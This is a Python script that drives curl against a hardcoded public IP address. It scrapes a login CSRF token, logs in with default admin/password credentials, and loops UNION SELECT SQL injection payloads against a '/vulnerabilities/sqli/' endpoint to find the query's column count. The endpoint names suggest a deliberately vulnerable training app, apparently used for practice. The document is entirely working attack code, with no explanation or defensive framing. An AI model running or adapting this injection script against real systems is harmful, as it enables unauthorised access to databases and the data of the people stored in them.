
import subprocess
import re

# Step 1: Get login page and extract token
cmd = [
    'curl',
    '-s',
    '-c', '/tmp/cookies.txt',
    'http://31.97.117.123/login.php'
]

result = subprocess.run(cmd, capture_output=True, text=True)
token_match = re.search(r"user_token['\"]?\s*value['\"]?\s*=\s*['\"]([a-f0-9]+)['\"]", result.stdout)
token = token_match.group(1) if token_match else None
print(f"[*] Token: {token}")

# Step 2: Login
cmd = [
    'curl',
    '-s',
    '-b', '/tmp/cookies.txt',
    '-c', '/tmp/cookies.txt',
    '-d', f'username=admin&password=password&user_token={token}&Login=Login',
    'http://31.97.117.123/login.php'
]

result = subprocess.run(cmd, capture_output=True, text=True)
print("[*] Logged in")

# Step 3: First test to figure out the correct column count
print("\n[*] Testing column counts...")

for num_cols in range(1, 5):
    columns = ','.join([str(i) for i in range(1, num_cols + 1)])
    test_id = f"999 UNION SELECT {columns}-- -"
    
    print(f"\n[*] Testing {num_cols} columns...")
    
    cmd = [
        'curl',
        '-s',
        '-b', '/tmp/cookies.txt',
        '-d', f'id={test_id}&Submit=Submit',
        'http://31.97.117.123/vulnerabilities/sqli/'
    ]
    
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
    
    # Look for pre section
    if '<pre>' in result.stdout:
        start = result.stdout.find('<pre>')
        end = result.stdout.find('</pre>', start) + 6
        section = result.stdout[start:end]
        
        if "The used SELECT" not in section and "error" not in section.lower():
            print(f"[+] Success with {num_cols} columns!")
            print(section)
            break
        else:
            print(f"[-] Column count {num_cols} failed")
            print(section[:200])

